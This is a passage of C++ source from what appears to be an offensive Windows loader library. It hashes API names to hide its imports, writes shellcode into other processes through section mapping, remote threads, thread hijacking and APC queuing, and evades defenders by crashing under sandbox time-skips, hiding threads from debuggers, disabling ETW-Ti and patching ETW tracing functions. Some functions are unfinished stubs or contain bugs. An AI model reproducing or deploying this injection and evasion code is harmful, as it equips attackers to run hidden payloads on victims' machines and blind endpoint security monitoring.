		constexpr DWORD hashgettokeninformation = HashStringFowlerNollVoVariant1a("GetTokenInformation");

		HMODULE advapi = GetModuleHandleC(hashadvapi);
		if (!advapi) goto EXIT_ROUTINE;

		pOpenProcessToken = (typeOpenProcessToken)GetProcAddressC(advapi, hashopenprocesstoken);
		pGetTokenInformation = (typeGetTokenInformation)GetProcAddressC(advapi, hashgettokeninformation);

		if (!pOpenProcessToken || !pGetTokenInformation)
			goto EXIT_ROUTINE;

		if (!pOpenProcessToken((HANDLE)(UINT_PTR)-1, TOKEN_QUERY, &hToken))
			goto EXIT_ROUTINE;

		if (!pGetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize))
			goto EXIT_ROUTINE;

		bFlag = TRUE;

	EXIT_ROUTINE:
		if (hToken)
			CloseHandle(hToken);

		return (bFlag ? Elevation.TokenIsElevated : FALSE);
	}

	////////////////////////////////
   //                            //
  //      Memory Management     //
 //                            //
////////////////////////////////

	//
	// Uses VirtualAllocExNuma, VirtualProtectEx and WriteProcessMemory to write shellcode into memory
	// Returns Base Address Handle on Success
	// Returns NULL on failure.
	//
	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		SIZE_T bytes_written = 0;
		PVOID address_ptr = NULL;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_ntallocatevirtualmemory = HashStringFowlerNollVoVariant1a("NtAllocateVirtualMemory");
		constexpr ULONG hash_ntprotectvirtualmemory = HashStringFowlerNollVoVariant1a("NtProtectVirtualMemory");
		constexpr ULONG hash_ntwritevirtualmemory = HashStringFowlerNollVoVariant1a("NtWriteVirtualMemory");
		constexpr ULONG hash_ntcreatethreadex = HashStringFowlerNollVoVariant1a("NtCreateThreadEx");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) return FALSE;

		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
		typeNtAllocateVirtualMemory NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)GetProcAddressC(ntdll, hash_ntallocatevirtualmemory);
		typeNtProtectVirtualMemory NtProtectVirtualMemory = (typeNtProtectVirtualMemory)GetProcAddressC(ntdll, hash_ntprotectvirtualmemory);
		typeNtWriteVirtualMemory NtWriteVirtualMemory = (typeNtWriteVirtualMemory)GetProcAddressC(ntdll, hash_ntwritevirtualmemory);
		typeNtCreateThreadEx NtCreateThreadEx = (typeNtCreateThreadEx)GetProcAddressC(ntdll, hash_ntcreatethreadex);

		if (!NT_SUCCESS(NtAllocateVirtualMemory(process_handle, &address_ptr, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
		{
			LOG_ERROR("Failed to allocate memory space (Code: %016llx)", GetLastErrorC());
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: %016llx", address_ptr);

		if (!NT_SUCCESS(NtWriteVirtualMemory(process_handle, address_ptr, shellcode, shellcode_size, &bytes_written)))
		{
			LOG_ERROR("Error writing shellcode to memory (Code: %016llx)", GetLastErrorC());
			return FALSE;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!NT_SUCCESS(NtProtectVirtualMemory(process_handle, &address_ptr, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
		{
			LOG_ERROR("Failed to change protection type (Code: %016llx)", GetLastErrorC());
			return FALSE;
		}
		else LOG_SUCCESS("Protection changed to RX.");

		return address_ptr;
	}

	//
	// Returns handle to current process' heap.
	//
	HANDLE GetProcessHeap(void)
	{
		return reinterpret_cast<HANDLE>(GetTEB()->ProcessEnvironmentBlock->ProcessHeap);
	}

	//
	// Allocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapAlloc(_In_ SIZE_T Size)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlallocateheap = HashStringFowlerNollVoVariant1a("RtlAllocateHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlAllocateHeap RtlAllocateHeap = (typeRtlAllocateHeap)GetProcAddressC(ntdll, hash_rtlallocateheap);
		if (!RtlAllocateHeap) return NULL;

		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
		return RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	}

	//
	// ReAllocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapReAlloc(_In_ PVOID BlockAddress, _In_ SIZE_T Size)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlreallocateheap = HashStringFowlerNollVoVariant1a("RtlReAllocateHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlReAllocateHeap RtlReAllocateHeap = (typeRtlReAllocateHeap)GetProcAddressC(ntdll, hash_rtlreallocateheap);
		if (!RtlReAllocateHeap) return NULL;

		return RtlReAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, BlockAddress, Size);
	}

	//
	// Free a block of memory in the current process' heap.
	// Returns TRUE on success, FALSE on failure.
	//
	BOOL HeapFree(_In_ PVOID BlockAddress)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlfreeheap = HashStringFowlerNollVoVariant1a("RtlFreeHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlFreeHeap RtlFreeHeap = (typeRtlFreeHeap)GetProcAddressC(ntdll, hash_rtlfreeheap);
		if (!RtlFreeHeap) return NULL;

		return RtlFreeHeap(GetProcessHeap(), NULL, BlockAddress) ? TRUE : FALSE;
	}

	//
	// memcmp
	//
	INT memcmp(const void* s1, const void* s2, size_t n)
	{
		const unsigned char* p1 = (const unsigned char*)s1;
		const unsigned char* end1 = p1 + n;
		const unsigned char* p2 = (const unsigned char*)s2;
		int                  d = 0;
		for (;;) {
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
		}
		return d;
	}

#if _WINDLL == 0 && !_DEBUG
	//
	// memcpy implementation.
	//
#pragma intrinsic(memcpy)
#pragma function(memcpy)
	void* __cdecl memcpy(void* dst, void const* src, size_t size) {
		for (volatile int i = 0; i < size; i++) {
			((BYTE*)dst)[i] = ((BYTE*)src)[i];
		}
		return dst;
	}

	//
	// memset implementation.
	//
#pragma intrinsic(memset)
#pragma function(memset)
	void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
		unsigned char* p = (unsigned char*)pTarget;
		while (cbTarget-- > 0) {
			*p++ = (unsigned char)value;
		}
		return pTarget;
	}
#endif

	//
	// Zero a region of memory.
	//
	VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size)
	{
		PULONG Dest = (PULONG)Destination;
		SIZE_T Count = Size / sizeof(ULONG);

		while (Count > 0)
		{
			*Dest = 0;
			Dest++;
			Count--;
		}

		return;
	}

	//
	// FreeVirtualMemory via NtFreeVirtualMemory
	// Uses MEM_RELEASE
	//
	VOID FreeVirtualMemory(_In_ HANDLE handle, _Inout_ PVOID base_address)
	{
		HMODULE ntdll;

		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_ntfreevirtualmemory = HashStringFowlerNollVoVariant1a("NtFreeVirtualMemory");

		ntdll = malapi::GetModuleHandleC(hash_ntdll);

		typeNtFreeVirtualMemory NtFreeVirtualMemory = (typeNtFreeVirtualMemory)GetProcAddressC(ntdll, hash_ntfreevirtualmemory);

		NtFreeVirtualMemory(handle, &base_address, 0, MEM_RELEASE);
		return;
	}

	//////////////////////////////////
   //                              //
  //      Alternative Signal      //
 //                              //
//////////////////////////////////

	VOID SleepEx(DWORD wait_time, BOOL alertable)
	{
		HMODULE kernel32 = NULL;
		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_sleepex = HashStringFowlerNollVoVariant1a("SleepEx");

		kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return;

		typeSleepEx SleepEx = (typeSleepEx)GetProcAddressC(kernel32, hash_sleepex);
		SleepEx(wait_time, alertable);
	}

	VOID WaitForSingleObject(HANDLE handle, DWORD wait_time)
	{
		HMODULE kernel32 = NULL;
		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_waitforsingleobject = HashStringFowlerNollVoVariant1a("WaitForSingleObject");
		kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return;
		typeWaitForSingleObject WaitForSingleObject = (typeWaitForSingleObject)GetProcAddressC(kernel32, hash_waitforsingleobject);

		WaitForSingleObject(handle, wait_time);
	}

	/////////////////////////////////
   //                             //
  //      Process Injection      //
 //                             //
/////////////////////////////////

	//
	// Inject shellcode into a target process via NtCreateSection -> NtMapViewOfSection -> RtlCreateUserThread.
	//
	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		NTSTATUS status;

		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntcreatesection = HashStringFowlerNollVoVariant1a("NtCreateSection");
		constexpr DWORD hash_ntmapviewofsection = HashStringFowlerNollVoVariant1a("NtMapViewOfSection");
		constexpr DWORD hash_ntunmapviewofsection = HashStringFowlerNollVoVariant1a("NtUnmapViewOfSection");
		constexpr DWORD hash_rtlcreateuserthread = HashStringFowlerNollVoVariant1a("RtlCreateUserThread");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return FALSE;

		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddressC(ntdll, hash_ntcreatesection);
		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
		typeNtUnmapViewOfSection NtUnmapViewOfSection = (typeNtUnmapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
		typeRtlCreateUserThread RtlCreateUserThread = (typeRtlCreateUserThread)GetProcAddressC(ntdll, hash_rtlcreateuserthread);
		if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread) return FALSE;

		LARGE_INTEGER section_size = { 0 };
		HANDLE section_handle = NULL, target_thread = NULL;
		PVOID addr_local_section = NULL, addr_remote_section = NULL;
		section_size.QuadPart = shellcode_size;

		// Create memory section.
		status = NtCreateSection(
			&section_handle,
			SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL
		);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to create memory section. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Memory Section Created");

		// Map the section to local process (RW)
		status = NtMapViewOfSection(
			section_handle,
			(HANDLE)-1,
			&addr_local_section,
			NULL,
			NULL,
			NULL,
			&shellcode_size,
			SECTION_INHERIT::ViewUnmap,
			NULL,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to map section to local process. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Memory Section Mapped to Local Process");

		// Map the section to target process (RX)
		status = NtMapViewOfSection(
			section_handle,
			process_handle,
			&addr_remote_section,
			NULL,
			NULL,
			NULL,
			&shellcode_size,
			SECTION_INHERIT::ViewUnmap,
			NULL,
			PAGE_EXECUTE_READ
		);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to map section to target. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Memory Section Mapped to Target");

		// Copy shellcode to mapped view.
		memcpy(addr_local_section, shellcode, shellcode_size);

		// Create thread.
		success = RtlCreateUserThread(
			process_handle,
			NULL,
			FALSE,
			0,
			0,
			0,
			(PUSER_THREAD_START_ROUTINE)addr_remote_section,
			NULL,
			&target_thread,
			NULL
		);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to create thread. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Created");

		success = TRUE;
	CLEANUP:
		NtUnmapViewOfSection(process_handle, addr_local_section);
		CloseHandle(additional_handle);
		CloseHandle(process_handle);
		return success;
	}

	//
	// Remote Thread Injection
	//
	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = INVALID_HANDLE_VALUE;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;

#pragma region Imports

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_ntwaitforsingleobject = HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
		constexpr ULONG hash_ntcreatethreadex = HashStringFowlerNollVoVariant1a("NtCreateThreadEx");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) return FALSE;

		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
		typeNtCreateThreadEx NtCreateThreadEx = (typeNtCreateThreadEx)GetProcAddressC(ntdll, hash_ntcreatethreadex);
		typeNtWaitForSingleObject NtWaitForSingleObject = (typeNtWaitForSingleObject)GetProcAddressC(ntdll, hash_ntwaitforsingleobject);

#pragma endregion

		address_ptr = WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		NTSTATUS status = NtCreateThreadEx(&thread_handle, THREAD_ALL_ACCESS, NULL, process_handle, (PUSER_THREAD_START_ROUTINE)address_ptr, NULL, FALSE, NULL, 0x1000, 0x10000, NULL);
		if (thread_handle == INVALID_HANDLE_VALUE)
		{
			LOG_ERROR("Error creating remote thread. (Code: %016llX)", status);
			goto CLEANUP;
		}
		else LOG_SUCCESS("Handle to Thread: 0x%016llX", thread_handle);

		NtWaitForSingleObject(thread_handle, NULL, NULL);
		success = TRUE;

	CLEANUP:
		if (process_handle)
		{
			FreeVirtualMemory(thread_handle, &address_ptr);
		}
		if (additional_handle)
		{
			CloseHandle(additional_handle);
		}
		return success;
	}

	//
	//Remote Thread Hijacking via Thread Enumeration
	//
	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		PVOID address_ptr = NULL;
		DWORD pid = 0;
		HANDLE proc_snapshot = NULL;
		HANDLE thread_handle = NULL;
		THREADENTRY32 thread_entry;
		CONTEXT context;

#pragma region Imports

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_virtualfreeex = HashStringFowlerNollVoVariant1a("VirtualFreeEx");
		constexpr ULONG hash_getprocessid = HashStringFowlerNollVoVariant1a("GetProcessId");
		constexpr ULONG hash_ntwaitforsingleobject = HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
		constexpr ULONG hash_ntresumethread = HashStringFowlerNollVoVariant1a("NtResumeThread");

		constexpr ULONG hash_createtoolhelp32snapshot = HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
		constexpr ULONG hash_thread32first = HashStringFowlerNollVoVariant1a("Thread32First");
		constexpr ULONG hash_thread32next = HashStringFowlerNollVoVariant1a("Thread32Next");
		constexpr ULONG hash_openthread = HashStringFowlerNollVoVariant1a("OpenThread");
		constexpr ULONG hash_suspendthread = HashStringFowlerNollVoVariant1a("SuspendThread");
		constexpr ULONG hash_gethreadcontext = HashStringFowlerNollVoVariant1a("GetThreadContext");
		constexpr ULONG hash_sethreadcontext = HashStringFowlerNollVoVariant1a("SetThreadContext");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) return FALSE;

		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
		typeVirtualFreeEx VirtualFreeExC = (typeVirtualFreeEx)GetProcAddressC(kernel32, hash_virtualfreeex);
		typeCreateToolhelp32Snapshot CreateToolhelp32SnapshotC = (typeCreateToolhelp32Snapshot)GetProcAddressC(kernel32, hash_createtoolhelp32snapshot);
		typeThread32First Thread32FirstC = (typeThread32First)GetProcAddressC(kernel32, hash_thread32first);
		typeThread32Next Thread32NextC = (typeThread32Next)GetProcAddressC(kernel32, hash_thread32next);
		typeGetProcessId GetProcessIdC = (typeGetProcessId)GetProcAddressC(kernel32, hash_getprocessid);
		typeOpenThread OpenThreadC = (typeOpenThread)GetProcAddressC(kernel32, hash_openthread);
		typeSuspendThread SuspendThreadC = (typeSuspendThread)GetProcAddressC(kernel32, hash_suspendthread);
		typeGetThreadContext GetThreadContextC = (typeGetThreadContext)GetProcAddressC(kernel32, hash_gethreadcontext);
		typeSetThreadContext SetThreadContextC = (typeSetThreadContext)GetProcAddressC(kernel32, hash_sethreadcontext);

		typeNtWaitForSingleObject NtWaitForSingleObjectC = (typeNtWaitForSingleObject)GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)GetProcAddressC(ntdll, hash_ntresumethread);

#pragma endregion

		context.ContextFlags = CONTEXT_FULL;
		thread_entry.dwSize = sizeof(THREADENTRY32);

		address_ptr = WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		proc_snapshot = CreateToolhelp32SnapshotC(TH32CS_SNAPTHREAD, 0);
		LOG_INFO("Process Snapshot: %08lX", proc_snapshot);

		Thread32FirstC(proc_snapshot, &thread_entry);
		pid = GetProcessIdC(process_handle);

		if (pid != 0)
		{
			LOG_SUCCESS("Got PID: %d", pid);
		}

		while (Thread32NextC(proc_snapshot, &thread_entry))
		{
			if (thread_entry.th32OwnerProcessID == pid)
			{
				thread_handle = OpenThreadC(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
				LOG_SUCCESS("Successfuly hijacked thread: %016llX", thread_handle);
				break;
			}
		}

		HideFromDebugger(thread_handle);

		if (!SuspendThreadC(thread_handle))
		{
			return LOG_ERROR("Failed to suspend thread. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Suspended.");

		if (!GetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("GetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Got Thread Context.");

#ifdef _WIN64
		context.Rip = (DWORD_PTR)address_ptr;
#else
		context.Eip = (DWORD_PTR)address_ptr;
#endif
		if (!SetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("SetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Set Thread Context.");

		NtResumeThreadC(thread_handle, NULL);
		NtResumeThreadC(thread_handle, NULL);

		LOG_SUCCESS("Thread Resumed.");

		NtWaitForSingleObjectC(thread_handle, NULL, NULL);

		success = TRUE;

	CLEANUP:
		FreeVirtualMemory(thread_handle, &address_ptr);
		return success;
	}

	//
	// InjectionAddressOfEntryPoint Injection
	//
	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE ntdll = NULL;

#pragma region Imports

		constexpr ULONG hash_ntresumethread = HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");

		ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return FALSE;

		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)GetProcAddressC(ntdll, hash_ntresumethread);

#pragma endregion

		// Handle from CONFIG_CREATE_PROCESS_METHOD 3
		NtResumeThreadC(process_handle, NULL);
		LOG_SUCCESS("Resuming Thread");

		success = TRUE;

	CLEANUP:
		CloseHandle(process_handle);
		return success;
	}

	//
	// Process Doppleganging
	//
	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;

#pragma region Imports

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return FALSE;

		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

#pragma endregion

		success = TRUE;

	CLEANUP:
		if (additional_handle)
		{
			CloseHandle(additional_handle);
		}
		CloseHandle(process_handle);
		return success;
	}

	//
	// QueueUserApc Injection
	//
	BOOL InjectionQueueUserAPC(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE ntdll = NULL;
		HMODULE kernel32 = NULL;

#pragma region Imports
		constexpr ULONG hash_ntresumethread = HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_queueuserapc = HashStringFowlerNollVoVariant1a("QueueUserAPC");
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");

		ntdll = GetModuleHandleC(hash_ntdll);
		kernel32 = GetModuleHandleC(hash_kernel32);

		typeQueueUserAPC QueueUserAPC = (typeQueueUserAPC)GetProcAddressC(kernel32, hash_queueuserapc);
		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddressC(ntdll, hash_ntresumethread);

#pragma endregion

		HANDLE base_address = WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
		QueueUserAPC((PAPCFUNC)base_address, additional_handle, 0);

		NtResumeThread(additional_handle, NULL);
		LOG_SUCCESS("Resuming Thread");

		success = TRUE;

	CLEANUP:
		FreeVirtualMemory(additional_handle, &base_address);
		if (additional_handle)
		{
			CloseHandle(additional_handle);
		}
		CloseHandle(process_handle);
		return success;
	}

	BOOL InjectionCaroKann(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		// Encrypt Shellcode
		// Allocate Memory for Encrypted Shellcode
		// Allocate Memory for Decryptor?? <-- Must be a shellcode :woe:
		// Create Execution Method for Shellcode(s)
		// Decrypt Shellcode during Runtime using the decryptor shellcode
		// Execute using Alternative Event Alert (SetWindowsHookEx)

		WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
		return TRUE;
	}

	///////////////////////
   //                   //
  //      Evasion      //
 //                   //
///////////////////////

	//
	// Get epoch timestamp (ms) from SHARED_USER_DATA
	//
	SIZE_T GetTimestamp(void)
	{
		const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks.
		const size_t TICKS_PER_MILLISECOND = 10000; // A tick is 100ns.
		LARGE_INTEGER time;
		time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14); // Read LowPart as unsigned long.
		time.HighPart = *(long*)(0x7FFE0000 + 0x1c); // Read High1Part as long.
		return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
	}

	//
	// Sleep implementation using `get_timestamp`,
	// will crash the process if time skipping is detected.
	//
	void SleepMs(_In_ SIZE_T Ms)
	{
		volatile size_t x = 0;
		size_t end_time = GetTimestamp() + Ms;
		while (GetTimestamp() < end_time) x += 1;

		// time skip check (crash process if so)
		if (GetTimestamp() > end_time + 1000)
		{
			volatile size_t crash = 0;
			x = *(int*)crash;
		}
	}

	void PatchFunction(FARPROC function)
	{
		DWORD old_protection = 0;

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return;
		typeVirtualProtectEx VirtualProtectEx = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);

		if (!VirtualProtectEx(0, function, 1, PAGE_EXECUTE_READWRITE, &old_protection)) return;
		memcpy(function, x64_ret, 1);
		if (!VirtualProtectEx(0, function, 1, old_protection, &old_protection)) return;
		LOG_SUCCESS("Function Patched!");
	}

	//
	// Abuse a bug to disable ETW-Ti for a target process.
	// More info: https://www.legacyy.xyz/defenseevasion/windows/2024/04/24/disabling-etw-ti-without-ppl.html
	//
	BOOL DisableETWTi(_In_ HANDLE TargetProcess)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_ntsetinformationprocess = HashStringFowlerNollVoVariant1a("NtSetInformationProcess");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return FALSE;
		typeNtSetInformationProcess NtSetInformationProcess = (typeNtSetInformationProcess)GetProcAddressC(ntdll, hash_ntsetinformationprocess);
		if (!NtSetInformationProcess) return FALSE;

		// Prepare for NtSetInformationProcess
		PROCESS_LOGGING_INFORMATION pli = { 0 };
		pli.Flags = (ULONG)0xf;
		pli.EnableReadVmLogging = 0;
		pli.EnableWriteVmLogging = 0;
		pli.EnableProcessSuspendResumeLogging = 0;
		pli.EnableThreadSuspendResumeLogging = 0;
		pli.Reserved = 26;

		NTSTATUS status = NtSetInformationProcess(
			TargetProcess,
			ProcessEnableLogging,
			&pli,
			sizeof(_PROCESS_LOGGING_INFORMATION));

		return NT_SUCCESS(status);
	}

	//
	// Patch ETW
	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
	//
	BOOL PatchEtwNtTraceEvent(void)
	{
		BOOL success = FALSE;
		HMODULE ntdll = NULL;

#pragma region imports

		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_nttraceevent = HashStringFowlerNollVoVariant1a("NtTraceEvent");

		ntdll = GetModuleHandleC(hash_ntdll);
		if (ntdll == NULL) return success;

		FARPROC NtTraceEvent = (FARPROC)GetProcAddressC(ntdll, hash_nttraceevent);

#pragma endregion

		PatchFunction(NtTraceEvent);

		success = TRUE;
		LOG_SUCCESS("ETW Patched!");
	CLEANUP:
		return success;
	}

#define x64_ret		0xc3
#define x64_rax		0x33
#define x64_mov		0xb8
#define x64_stub	0x20
#define x64_xor		0x48
#define MAX_SEARCH_INDEX 0xFF

	//
	// Patch ETW via EtwEventWrite/EtwEventWriteFull
	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
	//
	BOOL PatchEtwEventWrite(void)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;
		BYTE patch[] = {
			x64_xor, 0x31, 0xC0, // xor rax, rax
			x64_ret				 // ret
		};
		BYTE backup[sizeof(patch)] = { 0 };
		int offset = 0;
		int func_length = 0;

#pragma region imports

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("kernel32.dll");
		constexpr ULONG hash_virtualprotextex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");

		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_etweventwrite = HashStringFowlerNollVoVariant1a("EtwEventWrite");
		constexpr ULONG hash_etweventwritefull = HashStringFowlerNollVoVariant1a("EtwEventWriteFull");

		kernel32 = GetModuleHandleC(hash_kernel32);
		ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll || !kernel32) return success;

		typeVirtualProtectEx VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotextex);
		PBYTE EtwEventWriteC = (PBYTE)GetProcAddressC(ntdll, hash_etweventwrite);
		PBYTE EtwEventWriteFullC = (PBYTE)GetProcAddressC(ntdll, hash_etweventwritefull);

#pragma endregion

		while (TRUE)
		{
